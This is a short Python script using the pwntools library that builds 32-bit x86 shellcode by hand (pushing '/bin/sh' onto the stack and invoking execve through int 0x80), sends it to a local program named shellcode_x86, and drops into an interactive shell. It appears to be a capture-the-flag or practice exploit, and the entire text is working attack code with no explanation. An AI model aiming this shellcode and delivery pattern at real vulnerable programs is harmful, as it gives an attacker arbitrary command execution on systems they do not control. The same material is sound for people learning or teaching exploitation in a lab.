from pwn import *

context.arch = 'i386'

p = process("./shellcode_x86")

shellcode = asm("xor eax, eax")
shellcode += asm("push 0x0068732f")
shellcode += asm("push 0x6e69622f")
shellcode += asm("mov ebx, esp")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")
shellcode += asm("mov al, 0xb")
shellcode += asm("int 0x80")

# shellcode = shellcraft.execve("/bin/sh\x00", 0, 0)
# shellcode = asm(shellcode)
p.send(shellcode)

p.interactive()